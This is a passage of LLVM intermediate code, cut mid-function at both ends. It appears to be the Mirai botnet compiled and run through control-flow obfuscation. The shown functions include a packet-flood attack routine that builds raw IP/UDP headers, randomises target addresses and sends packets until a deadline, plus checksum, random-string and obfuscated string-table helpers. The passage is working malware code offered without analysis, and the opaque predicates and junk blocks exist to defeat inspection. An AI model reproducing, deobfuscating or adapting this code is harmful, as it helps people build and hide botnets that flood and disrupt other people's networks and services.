  %320 = mul i32 %317, %319
  %321 = urem i32 %320, 2
  %322 = icmp eq i32 %321, 0
  %323 = icmp slt i32 %318, 10
  %324 = or i1 %322, %323
  br i1 %324, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %316
  %325 = load i32*, i32** %21, align 8
  %326 = load i32, i32* %19, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds i32, i32* %325, i64 %327
  %329 = load i32, i32* %328, align 4
  %330 = load i8*, i8** %33, align 8
  %331 = load i16, i16* %24, align 2
  %332 = zext i16 %331 to i64
  %333 = call i64 @send(i32 %329, i8* %330, i64 %332, i32 16384)
  %334 = load i32, i32* @x.33
  %335 = load i32, i32* @y.34
  %336 = sub i32 %334, 1
  %337 = mul i32 %334, %336
  %338 = urem i32 %337, 2
  %339 = icmp eq i32 %338, 0
  %340 = icmp slt i32 %335, 10
  %341 = or i1 %339, %340
  br i1 %341, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %342

; <label>:342:                                    ; preds = %originalBBpart241
  %343 = load i32, i32* @x.33
  %344 = load i32, i32* @y.34
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %342
  %351 = load i32, i32* %19, align 4
  %352 = add nsw i32 %351, 1
  store i32 %352, i32* %19, align 4
  %353 = load i32, i32* @x.33
  %354 = load i32, i32* @y.34
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart251, label %originalBB43alteredBB

originalBBpart251:                                ; preds = %originalBB43
  br label %295

; <label>:361:                                    ; preds = %295
  %362 = load i32, i32* @x.33
  %363 = load i32, i32* @y.34
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %361
  %370 = call i64 @time(i64* null) #6
  %371 = load i32, i32* %27, align 4
  %372 = sext i32 %371 to i64
  %373 = icmp sgt i64 %370, %372
  %374 = load i32, i32* @x.33
  %375 = load i32, i32* @y.34
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %373, label %382, label %383

; <label>:382:                                    ; preds = %originalBBpart255
  br label %384

; <label>:383:                                    ; preds = %originalBBpart255
  br label %278

; <label>:384:                                    ; preds = %382, %137
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %385 = alloca i32, align 4
  %386 = alloca i8, align 1
  %387 = alloca %struct.attack_target*, align 8
  %388 = alloca i8, align 1
  %389 = alloca %struct.attack_option*, align 8
  %390 = alloca i32, align 4
  %391 = alloca i8**, align 8
  %392 = alloca i32*, align 8
  %393 = alloca i16, align 2
  %394 = alloca i16, align 2
  %395 = alloca i16, align 2
  %396 = alloca i8, align 1
  %397 = alloca %struct.sockaddr_in, align 4
  %398 = alloca i32, align 4
  %399 = alloca %struct.iphdr*, align 8
  %400 = alloca %struct.udphdr*, align 8
  %401 = alloca i8*, align 8
  %402 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %403 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %404 = alloca i8*, align 8
  store i32 %0, i32* %385, align 4
  store i8 %1, i8* %386, align 1
  store %struct.attack_target* %2, %struct.attack_target** %387, align 8
  store i8 %3, i8* %388, align 1
  store %struct.attack_option* %4, %struct.attack_option** %389, align 8
  store i32 0, i32* %390, align 4
  %405 = load i8, i8* %386, align 1
  %406 = zext i8 %405 to i64
  %407 = call noalias i8* @calloc(i64 %406, i64 8) #6
  %408 = bitcast i8* %407 to i8**
  store i8** %408, i8*** %391, align 8
  %409 = load i8, i8* %386, align 1
  %410 = zext i8 %409 to i64
  %411 = call noalias i8* @calloc(i64 %410, i64 4) #6
  %412 = bitcast i8* %411 to i32*
  store i32* %412, i32** %392, align 8
  %413 = load i8, i8* %388, align 1
  %414 = load %struct.attack_option*, %struct.attack_option** %389, align 8
  %415 = call i32 @attack_get_opt_int(i8 zeroext %413, %struct.attack_option* %414, i8 zeroext 7, i32 65535)
  %416 = trunc i32 %415 to i16
  store i16 %416, i16* %393, align 2
  %417 = load i8, i8* %388, align 1
  %418 = load %struct.attack_option*, %struct.attack_option** %389, align 8
  %419 = call i32 @attack_get_opt_int(i8 zeroext %417, %struct.attack_option* %418, i8 zeroext 6, i32 65535)
  %420 = trunc i32 %419 to i16
  store i16 %420, i16* %394, align 2
  %421 = load i8, i8* %388, align 1
  %422 = load %struct.attack_option*, %struct.attack_option** %389, align 8
  %423 = call i32 @attack_get_opt_int(i8 zeroext %421, %struct.attack_option* %422, i8 zeroext 0, i32 512)
  %424 = trunc i32 %423 to i16
  store i16 %424, i16* %395, align 2
  %425 = load i8, i8* %388, align 1
  %426 = load %struct.attack_option*, %struct.attack_option** %389, align 8
  %427 = call i32 @attack_get_opt_int(i8 zeroext %425, %struct.attack_option* %426, i8 zeroext 1, i32 1)
  %428 = trunc i32 %427 to i8
  store i8 %428, i8* %396, align 1
  %429 = bitcast %struct.sockaddr_in* %397 to i8*
  call void @llvm.memset.p0i8.i64(i8* %429, i8 0, i64 16, i32 4, i1 false)
  %430 = call i64 @time(i64* null) #6
  %431 = load i32, i32* %385, align 4
  %432 = sext i32 %431 to i64
  %_ = shl i64 %430, %432
  %433 = add nsw i64 %430, %432
  %434 = trunc i64 %433 to i32
  store i32 %434, i32* %398, align 4
  %435 = load i16, i16* %394, align 2
  %436 = zext i16 %435 to i32
  %437 = icmp eq i32 %436, 65535
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %105
  %438 = load i16, i16* %22, align 2
  %439 = call zeroext i16 @htons(i16 zeroext %438) #7
  %440 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %441 = load i32, i32* %19, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i64 %442
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i32 0, i32 0
  %445 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %444, i32 0, i32 1
  store i16 %439, i16* %445, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %155
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %181
  %446 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %447 = load i32, i32* %19, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i64 %448
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %449, i32 0, i32 1
  %451 = load i32, i32* %450, align 4
  %452 = call i32 @ntohl(i32 %451) #7
  %453 = call i32 @rand_next()
  %454 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %455 = load i32, i32* %19, align 4
  %456 = sext i32 %455 to i64
  %457 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %454, i64 %456
  %458 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %457, i32 0, i32 2
  %459 = load i8, i8* %458, align 4
  %460 = zext i8 %459 to i32
  %_11 = sub i32 %453, %460
  %gen = mul i32 %_11, %460
  %461 = lshr i32 %453, %460
  %_12 = sub i32 0, %452
  %gen13 = add i32 %_12, %461
  %_14 = sub i32 %452, %461
  %gen15 = mul i32 %_14, %461
  %_16 = sub i32 %452, %461
  %gen17 = mul i32 %_16, %461
  %_18 = sub i32 %452, %461
  %gen19 = mul i32 %_18, %461
  %_20 = shl i32 %452, %461
  %_21 = shl i32 %452, %461
  %_22 = sub i32 %452, %461
  %gen23 = mul i32 %_22, %461
  %462 = add i32 %452, %461
  %463 = call i32 @htonl(i32 %462) #7
  %464 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %465 = load i32, i32* %19, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %464, i64 %466
  %468 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %467, i32 0, i32 0
  %469 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %468, i32 0, i32 2
  %470 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %469, i32 0, i32 0
  store i32 %463, i32* %470, align 4
  br label %originalBB10

originalBB27alteredBB:                            ; preds = %originalBB27, %241
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %261
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %278
  store i32 0, i32* %19, align 4
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %316
  %471 = load i32*, i32** %21, align 8
  %472 = load i32, i32* %19, align 4
  %473 = sext i32 %472 to i64
  %474 = getelementptr inbounds i32, i32* %471, i64 %473
  %475 = load i32, i32* %474, align 4
  %476 = load i8*, i8** %33, align 8
  %477 = load i16, i16* %24, align 2
  %478 = zext i16 %477 to i64
  %479 = call i64 @send(i32 %475, i8* %476, i64 %478, i32 16384)
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %342
  %480 = load i32, i32* %19, align 4
  %_44 = sub i32 0, %480
  %gen45 = add i32 %_44, 1
  %_46 = sub i32 0, %480
  %gen47 = add i32 %_46, 1
  %_48 = sub i32 %480, 1
  %gen49 = mul i32 %_48, 1
  %481 = add nsw i32 %480, 1
  store i32 %481, i32* %19, align 4
  br label %originalBB43

originalBB53alteredBB:                            ; preds = %originalBB53, %361
  %482 = call i64 @time(i64* null) #6
  %483 = load i32, i32* %27, align 4
  %484 = sext i32 %483 to i64
  %485 = icmp sgt i64 %482, %484
  br label %originalBB53
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %originalBBpart2, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %35

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

; <label>:16:                                     ; preds = %9
  %17 = load i32, i32* @x.35
  %18 = load i32, i32* @y.36
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* %4, align 4
  %26 = sub i32 %25, 2
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* @x.35
  %28 = load i32, i32* @y.36
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %6

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* @x.35
  %37 = load i32, i32* @y.36
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %35
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 1
  %46 = load i32, i32* @x.35
  %47 = load i32, i32* @y.36
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %45, label %54, label %77

; <label>:54:                                     ; preds = %originalBBpart28
  %55 = load i32, i32* @x.35
  %56 = load i32, i32* @y.36
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %54
  %63 = load i16*, i16** %3, align 8
  %64 = load i16, i16* %63, align 2
  %65 = trunc i16 %64 to i8
  %66 = sext i8 %65 to i64
  %67 = load i64, i64* %5, align 8
  %68 = add i64 %67, %66
  store i64 %68, i64* %5, align 8
  %69 = load i32, i32* @x.35
  %70 = load i32, i32* @y.36
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart222, label %originalBB10alteredBB

originalBBpart222:                                ; preds = %originalBB10
  br label %77

; <label>:77:                                     ; preds = %originalBBpart222, %originalBBpart28
  %78 = load i64, i64* %5, align 8
  %79 = lshr i64 %78, 16
  %80 = load i64, i64* %5, align 8
  %81 = and i64 %80, 65535
  %82 = add i64 %79, %81
  store i64 %82, i64* %5, align 8
  %83 = load i64, i64* %5, align 8
  %84 = lshr i64 %83, 16
  %85 = load i64, i64* %5, align 8
  %86 = add i64 %85, %84
  store i64 %86, i64* %5, align 8
  %87 = load i64, i64* %5, align 8
  %88 = xor i64 %87, -1
  %89 = trunc i64 %88 to i16
  ret i16 %89

originalBBalteredBB:                              ; preds = %originalBB, %16
  %90 = load i32, i32* %4, align 4
  %_ = shl i32 %90, 2
  %_1 = sub i32 %90, 2
  %gen = mul i32 %_1, 2
  %_2 = sub i32 %90, 2
  %gen3 = mul i32 %_2, 2
  %_4 = sub i32 %90, 2
  %gen5 = mul i32 %_4, 2
  %91 = sub i32 %90, 2
  store i32 %91, i32* %4, align 4
  br label %originalBB

originalBB6alteredBB:                             ; preds = %originalBB6, %35
  %92 = load i32, i32* %4, align 4
  %93 = icmp eq i32 %92, 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %54
  %94 = load i16*, i16** %3, align 8
  %95 = load i16, i16* %94, align 2
  %96 = trunc i16 %95 to i8
  %97 = sext i8 %96 to i64
  %98 = load i64, i64* %5, align 8
  %_11 = shl i64 %98, %97
  %_12 = sub i64 %98, %97
  %gen13 = mul i64 %_12, %97
  %_14 = sub i64 0, %98
  %gen15 = add i64 %_14, %97
  %_16 = sub i64 0, %98
  %gen17 = add i64 %_16, %97
  %_18 = shl i64 %98, %97
  %_19 = sub i64 0, %98
  %gen20 = add i64 %_19, %97
  %99 = add i64 %98, %97
  store i64 %99, i64* %5, align 8
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %originalBBpart2, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %52

; <label>:26:                                     ; preds = %23
  %27 = load i32, i32* @x.37
  %28 = load i32, i32* @y.38
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %26
  %35 = load i16*, i16** %9, align 8
  %36 = load i16, i16* %35, align 2
  %37 = zext i16 %36 to i32
  %38 = load i32, i32* %12, align 4
  %39 = add i32 %38, %37
  store i32 %39, i32* %12, align 4
  %40 = load i16*, i16** %9, align 8
  %41 = getelementptr inbounds i16, i16* %40, i32 1
  store i16* %41, i16** %9, align 8
  %42 = load i32, i32* %8, align 4
  %43 = sub nsw i32 %42, 2
  store i32 %43, i32* %8, align 4
  %44 = load i32, i32* @x.37
  %45 = load i32, i32* @y.38
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %23

; <label>:52:                                     ; preds = %23
  %53 = load i32, i32* @x.37
  %54 = load i32, i32* @y.38
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %52
  %61 = load i32, i32* %8, align 4
  %62 = icmp eq i32 %61, 1
  %63 = load i32, i32* @x.37
  %64 = load i32, i32* @y.38
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br i1 %62, label %71, label %78

; <label>:71:                                     ; preds = %originalBBpart214
  %72 = load i16*, i16** %9, align 8
  %73 = bitcast i16* %72 to i8*
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  %76 = load i32, i32* %12, align 4
  %77 = add i32 %76, %75
  store i32 %77, i32* %12, align 4
  br label %78

; <label>:78:                                     ; preds = %71, %originalBBpart214
  %79 = load i32, i32* %10, align 4
  %80 = lshr i32 %79, 16
  %81 = and i32 %80, 65535
  %82 = load i32, i32* %12, align 4
  %83 = add i32 %82, %81
  store i32 %83, i32* %12, align 4
  %84 = load i32, i32* %10, align 4
  %85 = and i32 %84, 65535
  %86 = load i32, i32* %12, align 4
  %87 = add i32 %86, %85
  store i32 %87, i32* %12, align 4
  %88 = load i32, i32* %11, align 4
  %89 = lshr i32 %88, 16
  %90 = and i32 %89, 65535
  %91 = load i32, i32* %12, align 4
  %92 = add i32 %91, %90
  store i32 %92, i32* %12, align 4
  %93 = load i32, i32* %11, align 4
  %94 = and i32 %93, 65535
  %95 = load i32, i32* %12, align 4
  %96 = add i32 %95, %94
  store i32 %96, i32* %12, align 4
  %97 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %98 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %97, i32 0, i32 6
  %99 = load i8, i8* %98, align 1
  %100 = zext i8 %99 to i16
  %101 = call zeroext i16 @htons(i16 zeroext %100) #7
  %102 = zext i16 %101 to i32
  %103 = load i32, i32* %12, align 4
  %104 = add i32 %103, %102
  store i32 %104, i32* %12, align 4
  %105 = load i16, i16* %7, align 2
  %106 = zext i16 %105 to i32
  %107 = load i32, i32* %12, align 4
  %108 = add i32 %107, %106
  store i32 %108, i32* %12, align 4
  br label %109

; <label>:109:                                    ; preds = %113, %78
  %110 = load i32, i32* %12, align 4
  %111 = lshr i32 %110, 16
  %112 = icmp ne i32 %111, 0
  br i1 %112, label %113, label %119

; <label>:113:                                    ; preds = %109
  %114 = load i32, i32* %12, align 4
  %115 = and i32 %114, 65535
  %116 = load i32, i32* %12, align 4
  %117 = lshr i32 %116, 16
  %118 = add i32 %115, %117
  store i32 %118, i32* %12, align 4
  br label %109

; <label>:119:                                    ; preds = %109
  %120 = load i32, i32* %12, align 4
  %121 = xor i32 %120, -1
  %122 = trunc i32 %121 to i16
  ret i16 %122

originalBBalteredBB:                              ; preds = %originalBB, %26
  %123 = load i16*, i16** %9, align 8
  %124 = load i16, i16* %123, align 2
  %125 = zext i16 %124 to i32
  %126 = load i32, i32* %12, align 4
  %_ = shl i32 %126, %125
  %_1 = sub i32 %126, %125
  %gen = mul i32 %_1, %125
  %_2 = shl i32 %126, %125
  %_3 = shl i32 %126, %125
  %_4 = shl i32 %126, %125
  %_5 = sub i32 0, %126
  %gen6 = add i32 %_5, %125
  %_7 = sub i32 %126, %125
  %gen8 = mul i32 %_7, %125
  %127 = add i32 %126, %125
  store i32 %127, i32* %12, align 4
  %128 = load i16*, i16** %9, align 8
  %129 = getelementptr inbounds i16, i16* %128, i32 1
  store i16* %129, i16** %9, align 8
  %130 = load i32, i32* %8, align 4
  %_9 = sub i32 %130, 2
  %gen10 = mul i32 %_9, 2
  %_11 = shl i32 %130, 2
  %131 = sub nsw i32 %130, 2
  store i32 %131, i32* %8, align 4
  br label %originalBB

originalBB12alteredBB:                            ; preds = %originalBB12, %52
  %132 = load i32, i32* %8, align 4
  %133 = icmp eq i32 %132, 1
  br label %originalBB12
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = load i32, i32* @x.41
  %4 = load i32, i32* @y.42
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca [64 x i8], align 16
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  call void @table_unlock_val(i8 zeroext 39)
  %14 = getelementptr inbounds [64 x i8], [64 x i8]* %13, i32 0, i32 0
  %15 = call i8* @table_retrieve_val(i32 39, i32* null)
  %16 = call i8* @strcpy(i8* %14, i8* %15) #6
  %17 = load i32, i32* @x.41
  %18 = load i32, i32* @y.42
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %29, %originalBBpart2
  %26 = load i32, i32* %12, align 4
  %27 = add nsw i32 %26, -1
  store i32 %27, i32* %12, align 4
  %28 = icmp ne i32 %26, 0
  br i1 %28, label %29, label %39

; <label>:29:                                     ; preds = %25
  %30 = call i32 @rand_next()
  %31 = getelementptr inbounds [64 x i8], [64 x i8]* %13, i32 0, i32 0
  %32 = call i32 @util_strlen(i8* %31)
  %33 = urem i32 %30, %32
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds [64 x i8], [64 x i8]* %13, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = load i8*, i8** %11, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %11, align 8
  store i8 %36, i8* %37, align 1
  br label %25

; <label>:39:                                     ; preds = %25
  call void @table_lock_val(i8 zeroext 39)
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca [64 x i8], align 16
  store i8* %0, i8** %40, align 8
  store i32 %1, i32* %41, align 4
  call void @table_unlock_val(i8 zeroext 39)
  %43 = getelementptr inbounds [64 x i8], [64 x i8]* %42, i32 0, i32 0
  %44 = call i8* @table_retrieve_val(i32 39, i32* null)
  %45 = call i8* @strcpy(i8* %43, i8* %44) #6
  br label %originalBB
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  store i32 0, i32* %3, align 4
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %originalBBpart2, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %102

; <label>:34:                                     ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
